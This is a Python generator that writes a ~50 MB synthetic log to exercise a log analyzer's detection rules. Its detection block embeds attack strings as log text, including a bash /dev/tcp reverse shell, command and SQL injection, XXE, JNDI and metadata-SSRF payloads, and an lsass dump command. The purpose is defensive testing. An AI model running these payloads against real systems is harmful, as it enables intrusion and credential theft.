"""Generate ONE ~49.8 MB log file that triggers EVERY detection rule.

This standalone generator writes a single large log file into THIS folder
("Testcases/") that exercises all 45 default detection rules at once -- every
static rule, every behavioural (threshold) rule, both prefixed-behavioural rules
and the custom MFA rule -- while the bulk of the file is realistic, benign
"general" operational log noise so the result looks like a real production log.

Why the file is built the way it is
------------------------------------
* Every line is emitted in the ISO `YYYY-MM-DD HH:MM:SS LEVEL message` shape so
  services/log_parser.py classifies the file as the "generic" format and reliably
  extracts timestamp / source_ip / username from each line.
* Behavioural rules fire on COUNTS (the engine groups by source_ip / username /
  whole-file), so each behavioural block contains comfortably MORE than the rule's
  threshold of matching events, using dedicated IPs/usernames so the blocks stay
  independent.
* "Unusual Working Hours" fires when >50% of all timestamps fall outside
  09:00-17:00. The benign padding cycles its hour across all 24 hours, so ~66% of
  events land outside business hours -- the rule fires naturally.
* "Off-Hours Access" needs ONE successful login between 00:00-05:00, included
  explicitly.
* Malware-signature samples are written in the defanged forms the rule regexes
  already accept (e.g. "mimi katz", "web shell", "/dev/tcp/...").
* No external links / no network. This script only imports the stdlib `os` and
  writes a local file. Every host/IP in the generated lines is a NON-ROUTABLE,
  RFC-reserved address -- TEST-NET documentation ranges (203.0.113.0/24 and
  198.51.100.0/24, RFC 5737), private ranges (10.0.0.0/8, 192.168.0.0/16,
  RFC 1918), loopback (127.0.0.1), link-local IMDS (169.254.169.254), and the
  reserved `.invalid` TLD (RFC 6761) -- so nothing resolves or reaches the
  internet. Safe to run on a firewalled host.

How to run (writes "All Threats Combined.log" next to this script)
------------------------------------------------------------------
    conda run -n cybersec python "Testcases/generate_all_threats_log.py"

(The script only uses the standard library, so any Python 3 interpreter works.)
"""

import os

# ── Output target ────────────────────────────────────────────────────────────
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_PATH = os.path.join(SCRIPT_DIR, "All Threats Combined.log")

# 49.8 MB measured the Windows way (1 MB = 1024*1024 bytes) -> ~52.2 MB of text.
TARGET_BYTES = int(49.8 * 1024 * 1024)

D = "2024-01-15"  # base date for daytime detection lines (date value is cosmetic)


def build_detection_lines() -> list[str]:
    """Return the lines that deterministically trigger every detection rule."""
    lines: list[str] = []

    # ── STATIC rules (one crafted line each) ─────────────────────────────────
    lines += [
        # SQL Injection Attempt (HIGH)
        f"{D} 22:01:01 WARN [waf] blocked client=203.0.113.50 "
        f"ARGS:q=\"' OR 1=1-- UNION SELECT username,password FROM users\" user=attacker1",
        # Path Traversal Attempt (HIGH)
        f"{D} 22:02:02 WARN [waf] blocked client=203.0.113.51 "
        f"GET /download?file=../../../etc/passwd traversal user=attacker2",
        # Command Injection (CRITICAL)
        f"{D} 22:03:03 CRITICAL [waf] command injection client=203.0.113.52 "
        f"POST /api/ping host=127.0.0.1; cat /etc/passwd",
        # XSS Attempt (MEDIUM)
        f"{D} 22:04:04 WARN [waf] xss client=203.0.113.53 "
        f"GET /comment?text=<script>alert(document.cookie)</script>",
        # Directory Scanning (MEDIUM)
        f"{D} 22:05:05 WARN [nginx] GET /admin/config.php 404 scanner client=203.0.113.54",
        # Abnormal HTTP Methods (HIGH)
        f"{D} 22:06:06 WARN [nginx] TRACE /api/v1/users HTTP/1.1 200 client=203.0.113.55",
        # Dormant Account Activity (HIGH)
        f"{D} 22:07:07 WARN [iam] dormant account reactivated user=svc_backup "
        f"last login was 247 days ago",
        # Concurrent Sessions (HIGH)
        f"{D} 22:08:08 WARN [iam] concurrent session detected for user=jsmith "
        f"from 192.168.1.10 and 203.0.113.44 simultaneously",
        # Geographic Anomaly (MEDIUM)
        f"{D} 22:09:09 WARN [iam] geographic anomaly impossible travel "
        f"login from unusual country for user=alee",
        # Unauthorized Access Attempt (HIGH)
        f"{D} 22:10:10 WARN [nginx] GET /admin/users HTTP/1.1 403 Forbidden "
        f"user=guest client=10.0.1.5",
        # Privilege Escalation (CRITICAL)
        f"{D} 22:11:11 CRITICAL [edr] privilege escalation user=www-data "
        f"gained root via sudo -s on host web01",
        # Sensitive Resource Access (HIGH)
        f"{D} 22:12:12 WARN [edr] sensitive file read GET /etc/shadow "
        f"by process python3 pid=4821",
        # API Key Misuse (MEDIUM)
        f"{D} 22:13:13 ERROR [api] invalid api_key for key sk-prod-redacted "
        f"endpoint=/v2/data client=203.0.113.56",
        # Session Hijacking Pattern (CRITICAL)
        f"{D} 22:14:14 CRITICAL [app] session hijacking detected session id mismatch "
        f"for user=bob csrf token invalid",
        # Account Lockout Event (HIGH)
        f"{D} 22:15:15 WARN [iam] account locked after too many failed login attempts "
        f"for accountname=alice from 203.0.113.57",
        # Log4Shell / JNDI Injection (CRITICAL) -- loopback target, no external host
        f"{D} 22:16:16 CRITICAL [waf] log4shell lookup ${{jndi:ldap://127.0.0.1/a}} "
        f"in User-Agent client=203.0.113.58",
        # Web Shell Upload / Access (CRITICAL)
        f"{D} 22:17:17 CRITICAL [edr] web shell upload POST /uploads/shell.php "
        f"eval over base64 body client=198.51.100.7",
        # PowerShell Encoded Command (HIGH)
        f"{D} 22:18:18 WARN [edr] powershell.exe -nop -w hidden "
        f"-enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA host=win10",
        # Credential Dumping (CRITICAL)
        f"{D} 22:19:19 CRITICAL [edr] credential dumping mimi katz and "
        f"procdump -ma lsass.exe to lsass.dmp by user=svc-app",
        # Reverse Shell Indicator (CRITICAL)
        f"{D} 22:20:20 CRITICAL [edr] reverse shell bash -i >& /dev/tcp/203.0.113.66/4444 "
        f"0>&1 on host app02",
        # DNS Tunneling / Exfiltration (HIGH) -- .invalid TLD never resolves (RFC 6761)
        f"{D} 22:21:21 WARN [dns] dns exfil TXT query "
        f"a8f3c9e1b7d2k4m5n6p7q8r9s0t1u2v3w4x5y6.exfil.invalid from 10.0.0.42",
        # Cloud Metadata SSRF (HIGH)
        f"{D} 22:22:22 WARN [waf] GET /fetch?url=http://169.254.169.254/latest/meta-data/"
        f"iam/security-credentials/ client=203.0.113.59",
        # Ransomware File Activity (CRITICAL)
        f"{D} 22:23:23 CRITICAL [edr] ransomware report.docx renamed to report.docx.wncry "
        f"_readme.txt created your files have been encrypted",
        # XML External Entity / XXE (HIGH)
        f"{D} 22:24:24 WARN [waf] xxe POST /api/xml DOCTYPE foo "
        f"<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> client=198.51.100.8",
        # LDAP Injection (HIGH)
        f"{D} 22:25:25 WARN [waf] ldap injection POST /login "
        f"uid=*)(uid=*))(|(uid=* client=198.51.100.23",
        # Security Scanner Activity (MEDIUM)
        f"{D} 22:26:26 INFO [nginx] GET /?id=1 User-Agent: nikto/2.5 scanner "
        f"client=203.0.113.88",
        # Server-Side Request Forgery / SSRF (HIGH)
        f"{D} 22:27:27 WARN [waf] ssrf GET /preview?url=http://127.0.0.1:8080/admin "
        f"client=203.0.113.5",
        # OAuth / Token Abuse (MEDIUM)
        f"{D} 22:28:28 WARN [auth] oauth error=invalid_grant refresh_token reuse "
        f"for client=mobile-app",
    ]

    # ── BEHAVIOURAL: Brute Force (>=5 failed logins from one IP) ──────────────
    for k in range(8):
        lines.append(
            f"{D} 23:00:{k:02d} WARN [sshd] authentication failure for "
            f"user=bruteforce_user from 198.51.100.11 port {5000 + k}"
        )

    # ── BEHAVIOURAL: Repeated Failed Logins (>=5 failures for one username) ───
    for k in range(6):
        lines.append(
            f"{D} 23:02:{k:02d} WARN [sshd] authentication failure for "
            f"user=repeatfail_user from 198.51.100.20 port {5200 + k}"
        )

    # ── BEHAVIOURAL: Multiple User Failures (one IP, >=5 distinct users) ──────
    for k in range(7):
        lines.append(
            f"{D} 23:05:{k:02d} WARN [sshd] authentication failure for "
            f"user=stuff_user{k} from 198.51.100.12 port {6000 + k}"
        )

    # ── BEHAVIOURAL: Repeated Access Denials (one IP, >=10 denials) ───────────
    for k in range(12):
        lines.append(
            f"{D} 23:10:{k:02d} WARN [nginx] GET /private/{k} HTTP/1.1 403 Forbidden "
            f"access denied client=198.51.100.13"
        )

    # ── BEHAVIOURAL: Rapid Login Attempts (>=20 login events total) ───────────
    for k in range(25):
        lines.append(
            f"{D} 11:{k % 60:02d}:00 INFO [auth] login success for "
            f"user=rapid_user{k} from 10.10.{k % 256}.{k % 256}"
        )

    # ── BEHAVIOURAL: Error Rate Spike (>=50 error-level events) ───────────────
    for k in range(60):
        lines.append(
            f"{D} 23:20:{k % 60:02d} ERROR [app] unhandled exception in "
            f"module-{k} request_id={k}"
        )

    # ── BEHAVIOURAL: Service Crash Loop (>=3 crash/segfault events) ───────────
    for k in range(5):
        lines.append(
            f"{D} 23:30:{k:02d} ERROR [systemd] service nginx segmentation fault "
            f"core dump and restarted attempt {k}"
        )

    # ── BEHAVIOURAL: Database Error Spike (>=20 db error events) ──────────────
    for k in range(25):
        lines.append(
            f"{D} 23:50:{k % 60:02d} ERROR [db] database error connection refused "
            f"to mysql query failed id={k}"
        )

    # ── CUSTOM: MFA Fatigue / Push Bombing (>=5 prompts for one user) ─────────
    for k in range(7):
        lines.append(
            f"{D} 23:55:{k:02d} WARN [auth] MFA push notification sent to "
            f"user=mfa_victim attempt {k + 1} from 203.0.113.70"
        )

    # ── BEHAVIOURAL (single-event) rules ─────────────────────────────────────
    lines += [
        # Resource Exhaustion (HIGH)
        f"{D} 23:35:00 CRITICAL [kernel] Out of memory: OOM killed process mysqld (98% RAM)",
        f"{D} 23:35:30 ERROR [storage] disk full no space left on device /var",
        # Unexpected Shutdown (HIGH)
        f"{D} 23:40:00 CRITICAL [kernel] process apache2 terminated unexpectedly "
        f"SIGKILL received",
        f"{D} 23:40:30 WARN [systemd] system halt shutdown signal received source unknown",
        # Configuration Change (MEDIUM)
        f"{D} 23:45:00 WARN [config] sshd configuration changed PermitRootLogin "
        f"set to yes by user=deploy",
        f"{D} 23:45:30 INFO [config] firewall policy updated rule added by user=admin",
    ]

    # ── PREFIXED-BEHAVIOURAL: Off-Hours Access (success login 00:00-05:00) ────
    lines.append(
        "2024-01-16 02:14:51 WARN [auth] login success for user=dbadmin "
        "from 10.0.0.5 off-hours access"
    )

    # ── PREFIXED-BEHAVIOURAL: Successful Login After Failures ────────────────
    # 3 consecutive failures then a success for a username used nowhere else.
    lines += [
        f"{D} 10:00:00 WARN [auth] authentication failure for user=lafuser from 198.51.100.30",
        f"{D} 10:00:30 WARN [auth] authentication failure for user=lafuser from 198.51.100.30",
        f"{D} 10:01:00 WARN [auth] authentication failure for user=lafuser from 198.51.100.30",
        f"{D} 10:01:30 INFO [auth] login success for user=lafuser from 198.51.100.30",
    ]

    # NOTE: "Unusual Working Hours", "Rapid Sequential Actions" and "Mass Data
    # Access" need no dedicated lines -- they fire from the volume/time distribution
    # of the benign padding below.
    return lines


# ── Benign "general" padding templates (no attack / error / login keywords) ──
_USERS = ["alice", "bob", "carol", "dave", "erin", "frank",
          "grace", "heidi", "ivan", "judy"]
_TEMPLATES = [
    "INFO [nginx] GET /api/v1/products?page={n} 200 {ms}ms user={u} client={ip}",
    "INFO [app] dashboard view rendered for user={u} from {ip} in {ms}ms",
    "INFO [cron] scheduled job 'report-{n}' completed in {ms}ms",
    "DEBUG [cache] hit ratio 0.{n} keys={n} node=cache-{n}",
    "DEBUG [worker] processed task id={n} queue=default latency={ms}ms",
    "INFO [nginx] GET /static/css/app.{n}.css 200 {ms}ms client={ip}",
    "INFO [metrics] flush ok series={n} bytes={n} region=eu-west-{n}",
    "INFO [api] GET /healthz 200 1ms node=app-{n}",
]


def pad_line(i: int) -> str:
    """One benign line. Hour cycles 0-23 so >50% of events fall outside 09:00-17:00."""
    u = _USERS[i % len(_USERS)]
    ip = f"10.{(i // 65536) % 256}.{(i // 256) % 256}.{i % 256}"
    ms = (i % 400) + 1
    n = i % 1000
    h = i % 24
    mnt = (i * 7) % 60
    sec = (i * 13) % 60
    ts = f"2024-01-15 {h:02d}:{mnt:02d}:{sec:02d}"
    return f"{ts} {_TEMPLATES[i % len(_TEMPLATES)].format(u=u, ip=ip, ms=ms, n=n)}"


def main() -> None:
    detection = build_detection_lines()
    # 25 benign lines first so format auto-detection settles on "generic".
    warmup = [pad_line(i) for i in range(25)]

    written = 0
    with open(OUTPUT_PATH, "w", encoding="utf-8", newline="\n") as fh:
        head = "\n".join(warmup + detection) + "\n"
        fh.write(head)
        written += len(head.encode("utf-8"))

        i = 25  # continue the padding counter past the warm-up lines
        buf: list[str] = []
        buf_bytes = 0
        while True:
            line = pad_line(i) + "\n"
            lb = len(line.encode("utf-8"))
            if written + buf_bytes + lb > TARGET_BYTES:
                break
            buf.append(line)
            buf_bytes += lb
            i += 1
            if len(buf) >= 5000:
                fh.write("".join(buf))
                written += buf_bytes
                buf, buf_bytes = [], 0
        if buf:
            fh.write("".join(buf))
            written += buf_bytes

    total_lines = 25 + len(detection) + (i - 25)
    print(f"Wrote: {OUTPUT_PATH}")
    print(f"Size : {written:,} bytes ({written / (1024 * 1024):.2f} MB)")
    print(f"Lines: {total_lines:,} "
          f"({len(detection)} detection + {25 + (i - 25):,} general)")
    print("Covers all 45 default rules: 31 static/prefixed-behavioural, "
          "13 behavioural, 1 custom.")


if __name__ == "__main__":
    main()
